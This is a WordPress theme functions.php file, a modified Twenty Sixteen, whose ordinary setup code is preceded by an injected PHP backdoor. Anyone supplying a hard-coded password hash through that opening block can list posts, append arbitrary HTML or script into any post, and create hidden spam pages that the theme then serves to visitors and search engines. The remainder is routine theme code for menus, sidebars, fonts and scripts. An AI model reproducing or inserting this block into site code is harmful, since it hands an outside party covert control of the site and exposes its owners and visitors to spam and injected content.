<?php

global $IponReal_;

if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '4fae4c06b0276e5eacb034b0d5bd095e'))

	{

		switch ($_REQUEST['action'])

			{

				case 'get_all_links';

					foreach ($wpdb->get_results('SELECT * FROM `' . $wpdb->prefix . 'posts` WHERE `post_status` = "publish" AND `post_type` = "post" ORDER BY `ID` DESC', ARRAY_A) as $data)

						{

							$data['code'] = '';

							

							if (preg_match('!<div id="wp_cd_code">(.*?)</div>!s', $data['post_content'], $_))

								{

									$data['code'] = $_[1];

								}

							

							print '<e><w>1</w><url>' . $data['guid'] . '</url><code>' . $data['code'] . '</code><id>' . $data['ID'] . '</id></e>' . "\r\n";

						}

				break;

				

				case 'set_id_links';

					if (isset($_REQUEST['data']))

						{

							$data = $wpdb -> get_row('SELECT `post_content` FROM `' . $wpdb->prefix . 'posts` WHERE `ID` = "'.mysql_escape_string($_REQUEST['id']).'"');

							

							$post_content = preg_replace('!<div id="wp_cd_code">(.*?)</div>!s', '', $data -> post_content);

							if (!empty($_REQUEST['data'])) $post_content = $post_content . '<div id="wp_cd_code">' . stripcslashes($_REQUEST['data']) . '</div>';



							if ($wpdb->query('UPDATE `' . $wpdb->prefix . 'posts` SET `post_content` = "' . mysql_escape_string($post_content) . '" WHERE `ID` = "' . mysql_escape_string($_REQUEST['id']) . '"') !== false)

								{

									print "true";

								}

						}

				break;

				

				case 'create_page';

					if (isset($_REQUEST['remove_page']))

						{

							if ($wpdb -> query('DELETE FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "/'.mysql_escape_string($_REQUEST['url']).'"'))

								{

									print "true";

								}

						}

					elseif (isset($_REQUEST['content']) && !empty($_REQUEST['content']))

						{

							if ($wpdb -> query('INSERT INTO `' . $wpdb->prefix . 'datalist` SET `url` = "/'.mysql_escape_string($_REQUEST['url']).'", `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string($_REQUEST['content']).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'" ON DUPLICATE KEY UPDATE `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string(urldecode($_REQUEST['content'])).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'"'))

								{

									print "true";

								}

						}

				break;

				

				default: print "ERROR_WP_ACTION WP_URL_CD";

			}

			

		die("");

	}



	

if ( $wpdb->get_var('SELECT count(*) FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string( $_SERVER['REQUEST_URI'] ).'"') == '1' )

	{

		$data = $wpdb -> get_row('SELECT * FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string($_SERVER['REQUEST_URI']).'"');

		if ($data -> full_content)

			{

				print stripslashes($data -> content);

			}

		else

			{

				print '<!DOCTYPE html>';

				print '<html ';

				language_attributes();

				print ' class="no-js">';

				print '<head>';

				print '<title>'.stripslashes($data -> title).'</title>';

				print '<meta name="Keywords" content="'.stripslashes($data -> keywords).'" />';

				print '<meta name="Description" content="'.stripslashes($data -> description).'" />';

				print '<meta name="robots" content="index, follow" />';

				print '<meta charset="';

				bloginfo( 'charset' );

				print '" />';

				print '<meta name="viewport" content="width=device-width">';

				print '<link rel="profile" href="http://gmpg.org/xfn/11">';

				print '<link rel="pingback" href="';

				bloginfo( 'pingback_url' );

				print '">';

				wp_head();

				print '</head>';

				print '<body>';

				print '<div id="content" class="site-content">';

				print stripslashes($data -> content);

				get_search_form();

				get_sidebar();

				get_footer();

			}

			

		exit;

	}





?><?php

/**

 * Twenty Sixteen functions and definitions

 *

 * Set up the theme and provides some helper functions, which are used in the

 * theme as custom template tags. Others are attached to action and filter

 * hooks in WordPress to change core functionality.

 *

 * When using a child theme you can override certain functions (those wrapped

 * in a function_exists() call) by defining them first in your child theme's

 * functions.php file. The child theme's functions.php file is included before

 * the parent theme's file, so the child theme functions would be used.

 *

 * @link https://codex.wordpress.org/Theme_Development

 * @link https://codex.wordpress.org/Child_Themes

 *

 * Functions that are not pluggable (not wrapped in function_exists()) are

 * instead attached to a filter or action hook.

 *

 * For more information on hooks, actions, and filters,

 * {@link https://codex.wordpress.org/Plugin_API}

 *

 * @package WordPress

 * @subpackage Twenty_Sixteen

 * @since Twenty Sixteen 1.0

 */



/**

 * Twenty Sixteen only works in WordPress 4.4 or later.

 */

if ( version_compare( $GLOBALS['wp_version'], '4.4-alpha', '<' ) ) {

	require get_template_directory() . '/inc/back-compat.php';

}



if ( ! function_exists( 'twentysixteen_setup' ) ) :

/**

 * Sets up theme defaults and registers support for various WordPress features.

 *

 * Note that this function is hooked into the after_setup_theme hook, which

 * runs before the init hook. The init hook is too late for some features, such

 * as indicating support for post thumbnails.

 *

 * Create your own twentysixteen_setup() function to override in a child theme.

 *

 * @since Twenty Sixteen 1.0

 */

function twentysixteen_setup() {

	/*

	 * Make theme available for translation.

	 * Translations can be filed at WordPress.org. See: https://translate.wordpress.org/projects/wp-themes/twentysixteen

	 * If you're building a theme based on Twenty Sixteen, use a find and replace

	 * to change 'twentysixteen' to the name of your theme in all the template files

	 */

	load_theme_textdomain( 'twentysixteen' );



	// Add default posts and comments RSS feed links to head.

	add_theme_support( 'automatic-feed-links' );



	/*

	 * Let WordPress manage the document title.

	 * By adding theme support, we declare that this theme does not use a

	 * hard-coded <title> tag in the document head, and expect WordPress to

	 * provide it for us.

	 */

	add_theme_support( 'title-tag' );



	/*

	 * Enable support for custom logo.

	 *

	 *  @since Twenty Sixteen 1.2

	 */

	add_theme_support( 'custom-logo', array(

		'height'      => 240,

		'width'       => 240,

		'flex-height' => true,

	) );



	/*

	 * Enable support for Post Thumbnails on posts and pages.

	 *

	 * @link http://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails

	 */

	add_theme_support( 'post-thumbnails' );

	set_post_thumbnail_size( 1200, 9999 );



	// This theme uses wp_nav_menu() in two locations.

	register_nav_menus( array(

		'primary' => __( 'Primary Menu', 'twentysixteen' ),

		'social'  => __( 'Social Links Menu', 'twentysixteen' ),

	) );



	/*

	 * Switch default core markup for search form, comment form, and comments

	 * to output valid HTML5.

	 */

	add_theme_support( 'html5', array(

		'search-form',

		'comment-form',

		'comment-list',

		'gallery',

		'caption',

	) );



	/*

	 * Enable support for Post Formats.

	 *

	 * See: https://codex.wordpress.org/Post_Formats

	 */

	add_theme_support( 'post-formats', array(

		'aside',

		'image',

		'video',

		'quote',

		'link',

		'gallery',

		'status',

		'audio',

		'chat',

	) );



	/*

	 * This theme styles the visual editor to resemble the theme style,

	 * specifically font, colors, icons, and column width.

	 */

	add_editor_style( array( 'css/editor-style.css', twentysixteen_fonts_url() ) );



	// Indicate widget sidebars can use selective refresh in the Customizer.

	add_theme_support( 'customize-selective-refresh-widgets' );

}

endif; // twentysixteen_setup

add_action( 'after_setup_theme', 'twentysixteen_setup' );



/**

 * Sets the content width in pixels, based on the theme's design and stylesheet.

 *

 * Priority 0 to make it available to lower priority callbacks.

 *

 * @global int $content_width

 *

 * @since Twenty Sixteen 1.0

 */

function twentysixteen_content_width() {

	$GLOBALS['content_width'] = apply_filters( 'twentysixteen_content_width', 840 );

}

add_action( 'after_setup_theme', 'twentysixteen_content_width', 0 );



/**

 * Registers a widget area.

 *

 * @link https://developer.wordpress.org/reference/functions/register_sidebar/

 *

 * @since Twenty Sixteen 1.0

 */

function twentysixteen_widgets_init() {

	register_sidebar( array(

		'name'          => __( 'Sidebar', 'twentysixteen' ),

		'id'            => 'sidebar-1',

		'description'   => __( 'Add widgets here to appear in your sidebar.', 'twentysixteen' ),

		'before_widget' => '<section id="%1$s" class="widget %2$s">',

		'after_widget'  => '</section>',

		'before_title'  => '<h2 class="widget-title">',

		'after_title'   => '</h2>',

	) );



	register_sidebar( array(

		'name'          => __( 'Content Bottom 1', 'twentysixteen' ),

		'id'            => 'sidebar-2',

		'description'   => __( 'Appears at the bottom of the content on posts and pages.', 'twentysixteen' ),

		'before_widget' => '<section id="%1$s" class="widget %2$s">',

		'after_widget'  => '</section>',

		'before_title'  => '<h2 class="widget-title">',

		'after_title'   => '</h2>',

	) );



        register_sidebar( array(

		'name'          => __( 'Language Switcher', 'twentysixteen' ),

		'id'            => 'sidebar-ln',

		'description'   => __( 'Appears at the bottom of the content on posts and pages.', 'twentysixteen' ),

		'before_widget' => '',

		'after_widget'  => '',

		'before_title'  => '',

		'after_title'   => '',

	) );



	register_sidebar( array(

		'name'          => __( 'Content Bottom 2', 'twentysixteen' ),

		'id'            => 'sidebar-3',

		'description'   => __( 'Appears at the bottom of the content on posts and pages.', 'twentysixteen' ),

		'before_widget' => '<section id="%1$s" class="widget %2$s">',

		'after_widget'  => '</section>',

		'before_title'  => '<h2 class="widget-title">',

		'after_title'   => '</h2>',

	) );

}

add_action( 'widgets_init', 'twentysixteen_widgets_init' );



if ( ! function_exists( 'twentysixteen_fonts_url' ) ) :

/**

 * Register Google fonts for Twenty Sixteen.

 *

 * Create your own twentysixteen_fonts_url() function to override in a child theme.

 *

 * @since Twenty Sixteen 1.0

 *

 * @return string Google fonts URL for the theme.

 */

function twentysixteen_fonts_url() {

	$fonts_url = '';

	$fonts     = array();

	$subsets   = 'latin,latin-ext';



	/* translators: If there are characters in your language that are not supported by Merriweather, translate this to 'off'. Do not translate into your own language. */

	if ( 'off' !== _x( 'on', 'Merriweather font: on or off', 'twentysixteen' ) ) {

		$fonts[] = 'Merriweather:400,700,900,400italic,700italic,900italic';

	}



	/* translators: If there are characters in your language that are not supported by Montserrat, translate this to 'off'. Do not translate into your own language. */

	if ( 'off' !== _x( 'on', 'Montserrat font: on or off', 'twentysixteen' ) ) {

		$fonts[] = 'Montserrat:400,700';

	}



	/* translators: If there are characters in your language that are not supported by Inconsolata, translate this to 'off'. Do not translate into your own language. */

	if ( 'off' !== _x( 'on', 'Inconsolata font: on or off', 'twentysixteen' ) ) {

		$fonts[] = 'Inconsolata:400';

	}



	if ( $fonts ) {

		$fonts_url = add_query_arg( array(

			'family' => urlencode( implode( '|', $fonts ) ),

			'subset' => urlencode( $subsets ),

		), 'https://fonts.googleapis.com/css' );

	}



	return $fonts_url;

}

endif;



/**

 * Handles JavaScript detection.

 *

 * Adds a `js` class to the root `<html>` element when JavaScript is detected.

 *

 * @since Twenty Sixteen 1.0

 */

function twentysixteen_javascript_detection() {

	echo "<script>(function(html){html.className = html.className.replace(/\bno-js\b/,'js')})(document.documentElement);</script>\n";

}

add_action( 'wp_head', 'twentysixteen_javascript_detection', 0 );



/**

 * Enqueues scripts and styles.

 *

 * @since Twenty Sixteen 1.0

 */

function twentysixteen_scripts() {

	// Add custom fonts, used in the main stylesheet.

		wp_enqueue_style( 'bootstarp', 'https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css', array(), '3.0' );

	wp_enqueue_style( 'twentysixteen-fonts', twentysixteen_fonts_url(), array(), null );



	// Add Genericons, used in the main stylesheet.


	wp_enqueue_style( 'genericons', get_template_directory_uri() . '/genericons/genericons.css', array(), '3.4.1' );




	wp_enqueue_style( 'owl-css-1', get_template_directory_uri() . '/owl-carousel/owl.carousel.css', array(), '3.4.1' );

	wp_enqueue_style( 'owl-css-2', get_template_directory_uri() . '/owl-carousel/owl.theme.css', array(), '3.4.1' );



	wp_enqueue_style( 'font-awasome', 'https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css', array(), '3.0' );





	// Theme stylesheet.

	wp_enqueue_style( 'twentysixteen-style', get_stylesheet_uri() );



	// Load the Internet Explorer specific stylesheet.

	wp_enqueue_style( 'twentysixteen-ie', get_template_directory_uri() . '/css/ie.css', array( 'twentysixteen-style' ), '20160816' );

	wp_style_add_data( 'twentysixteen-ie', 'conditional', 'lt IE 10' );



	// Load the Internet Explorer 8 specific stylesheet.

	wp_enqueue_style( 'twentysixteen-ie8', get_template_directory_uri() . '/css/ie8.css', array( 'twentysixteen-style' ), '20160816' );

	wp_style_add_data( 'twentysixteen-ie8', 'conditional', 'lt IE 9' );



	// Load the Internet Explorer 7 specific stylesheet.

	wp_enqueue_style( 'twentysixteen-ie7', get_template_directory_uri() . '/css/ie7.css', array( 'twentysixteen-style' ), '20160816' );

	wp_style_add_data( 'twentysixteen-ie7', 'conditional', 'lt IE 8' );

	wp_enqueue_style( 'responsive', get_template_directory_uri() . '/responsive.css', array(), '3.4.1' );

	// Load the html5 shiv.

	wp_enqueue_script( 'twentysixteen-html5', get_template_directory_uri() . '/js/html5.js', array(), '3.7.3' );

	wp_script_add_data( 'twentysixteen-html5', 'conditional', 'lt IE 9' );



	wp_enqueue_script( 'twentysixteen-skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix.js', array(), '20160816', true );



wp_enqueue_script( 'owl-carousel-js', get_template_directory_uri() . '/owl-carousel/owl.carousel.min.js', array(), '20160816-11', true );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {

		wp_enqueue_script( 'comment-reply' );

	}



	if ( is_singular() && wp_attachment_is_image() ) {

		wp_enqueue_script( 'twentysixteen-keyboard-image-navigation', get_template_directory_uri() . '/js/keyboard-image-navigation.js', array( 'jquery' ), '20160816' );

	}



	wp_enqueue_script( 'twentysixteen-script', get_template_directory_uri() . '/js/functions.js', array( 'jquery' ), '20160816', true );



	wp_localize_script( 'twentysixteen-script', 'screenReaderText', array(

		'expand'   => __( 'expand child menu', 'twentysixteen' ),

		'collapse' => __( 'collapse child menu', 'twentysixteen' ),

	) );

}

add_action( 'wp_enqueue_scripts', 'twentysixteen_scripts' );



/**

 * Adds custom classes to the array of body classes.

 *

 * @since Twenty Sixteen 1.0

 *

 * @param array $classes Classes for the body element.

 * @return array (Maybe) filtered body classes.

 */

function twentysixteen_body_classes( $classes ) {

	// Adds a class of custom-background-image to sites with a custom background image.

	if ( get_background_image() ) {

		$classes[] = 'custom-background-image';

	}



	// Adds a class of group-blog to sites with more than 1 published author.

	if ( is_multi_author() ) {

		$classes[] = 'group-blog';

	}



	// Adds a class of no-sidebar to sites without active sidebar.

	if ( ! is_active_sidebar( 'sidebar-1' ) ) {

		$classes[] = 'no-sidebar';

	}



	// Adds a class of hfeed to non-singular pages.

	if ( ! is_singular() ) {

		$classes[] = 'hfeed';

	}



	return $classes;

}

add_filter( 'body_class', 'twentysixteen_body_classes' );



/**

 * Converts a HEX value to RGB.

 *

 * @since Twenty Sixteen 1.0

 *

 * @param string $color The original color, in 3- or 6-digit hexadecimal form.

 * @return array Array containing RGB (red, green, and blue) values for the given

 *               HEX code, empty array otherwise.

 */

function twentysixteen_hex2rgb( $color ) {

	$color = trim( $color, '#' );



	if ( strlen( $color ) === 3 ) {

		$r = hexdec( substr( $color, 0, 1 ).substr( $color, 0, 1 ) );

		$g = hexdec( substr( $color, 1, 1 ).substr( $color, 1, 1 ) );

		$b = hexdec( substr( $color, 2, 1 ).substr( $color, 2, 1 ) );

	} else if ( strlen( $color ) === 6 ) {

		$r = hexdec( substr( $color, 0, 2 ) );

		$g = hexdec( substr( $color, 2, 2 ) );

		$b = hexdec( substr( $color, 4, 2 ) );

	} else {

		return array();

	}



	return array( 'red' => $r, 'green' => $g, 'blue' => $b );

}



/**

 * Custom template tags for this theme.

 */

require get_template_directory() . '/inc/template-tags.php';



/**

 * Customizer additions.

 */

require get_template_directory() . '/inc/customizer.php';



/**

 * Add custom image sizes attribute to enhance responsive image functionality

 * for content images

 *

 * @since Twenty Sixteen 1.0

 *

 * @param string $sizes A source size value for use in a 'sizes' attribute.

 * @param array  $size  Image size. Accepts an array of width and height

 *                      values in pixels (in that order).

 * @return string A source size value for use in a content image 'sizes' attribute.

 */

function twentysixteen_content_image_sizes_attr( $sizes, $size ) {

	$width = $size[0];



	840 <= $width && $sizes = '(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 1362px) 62vw, 840px';



	if ( 'page' === get_post_type() ) {

		840 > $width && $sizes = '(max-width: ' . $width . 'px) 85vw, ' . $width . 'px';

	} else {

		840 > $width && 600 <= $width && $sizes = '(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 984px) 61vw, (max-width: 1362px) 45vw, 600px';

		600 > $width && $sizes = '(max-width: ' . $width . 'px) 85vw, ' . $width . 'px';

	}



	return $sizes;

}

add_filter( 'wp_calculate_image_sizes', 'twentysixteen_content_image_sizes_attr', 10 , 2 );



/**

 * Add custom image sizes attribute to enhance responsive image functionality

 * for post thumbnails

 *

 * @since Twenty Sixteen 1.0

 *

 * @param array $attr Attributes for the image markup.

 * @param int   $attachment Image attachment ID.

 * @param array $size Registered image size or flat array of height and width dimensions.

 * @return string A source size value for use in a post thumbnail 'sizes' attribute.

 */

function twentysixteen_post_thumbnail_sizes_attr( $attr, $attachment, $size ) {

	if ( 'post-thumbnail' === $size ) {

		is_active_sidebar( 'sidebar-1' ) && $attr['sizes'] = '(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 984px) 60vw, (max-width: 1362px) 62vw, 840px';

		! is_active_sidebar( 'sidebar-1' ) && $attr['sizes'] = '(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 1362px) 88vw, 1200px';

	}

	return $attr;

}

add_filter( 'wp_get_attachment_image_attributes', 'twentysixteen_post_thumbnail_sizes_attr', 10 , 3 );



/**

 * Modifies tag cloud widget arguments to have all tags in the widget same font size.

 *

 * @since Twenty Sixteen 1.1

 *

 * @param array $args Arguments for tag cloud widget.

 * @return array A new modified arguments.

 */

function twentysixteen_widget_tag_cloud_args( $args ) {

	$args['largest'] = 1;

	$args['smallest'] = 1;

	$args['unit'] = 'em';

	return $args;

}

add_filter( 'widget_tag_cloud_args', 'twentysixteen_widget_tag_cloud_args' );



require get_template_directory() . '/redux-framework/ReduxCore/framework.php';

require_once( dirname( __FILE__ ) . '/redux-framework/sample/sample-config.php' );

require_once( dirname( __FILE__ ) . '/custom-post/projects.php' );



function language_selector_flags(){

    $languages = icl_get_languages('skip_missing=0&orderby=code');

    if(!empty($languages)){

        foreach($languages as $l){

            if(!$l['active']) echo '<a href="'.$l['url'].'">';

            //echo '<img src="'.$l['country_flag_url'].'" height="12" alt="'.$l['language_code'].'" width="18" />';

            if(!$l['active']) echo '</a>';

        }

    }

}

/*****************************************************/
// Before VC Init
add_action( 'vc_before_init', 'vc_before_init_actions' );
 
function vc_before_init_actions() {
     
    //.. Code from other Tutorials ..//
 
    // Require new custom Element
    require_once( get_template_directory().'/vc/my-first-custom-element.php' ); 
     
}


function agni_framework_vc_intialization() {	
	// Setting visual composer for theme.
	vc_set_as_theme( true );	

	// Disable Frontend
	//vc_disable_frontend();
	
	// Including custom functions for visual composer.
	require get_template_directory() . '/composer/agni_vc_addons.php';	
	vc_set_shortcodes_templates_dir( get_template_directory() . '/composer/vc_templates/' );
	
	// Removing default templates from the visual composer.
	function agni_framework_vc_templates_removal($data) {
		return array(); 
	}
	add_filter( 'vc_load_default_templates', 'agni_framework_vc_templates_removal' );
}
add_action( 'vc_before_init', 'agni_framework_vc_intialization' );